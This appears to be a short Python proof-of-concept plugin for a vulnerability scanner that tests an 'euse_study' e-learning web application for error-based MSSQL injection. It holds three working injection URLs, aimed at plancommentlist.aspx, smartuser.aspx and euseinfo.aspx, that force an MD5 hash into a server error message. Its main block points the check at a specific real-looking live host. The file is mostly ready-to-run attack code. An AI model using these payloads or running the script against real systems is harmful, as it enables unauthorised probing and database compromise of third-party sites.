#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:xq17

def assign(service,arg):
    if service=="euse_study":
        return True,arg 
    


def  audit(arg):
    ps=[
        "Plan/plancommentlist.aspx?type=3&targetid=1%27and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--",
        "repoort/smartuser.aspx?di=1%27and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--",
        "euseinfo.aspx?id=1and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--",
     ]
    for p in ps:
        url=arg+p
        code, head, res, errcode, _ = curl.curl2(url)
        if code==500 and "81dc9bdb52d04dc20036dbd8313ed055" in res:
            security_hole(url)  
            
if __name__=="__main__":
    from dummy import *
    audit(assign('euse_study','http://elearning.chang-de.com:6088/')[1])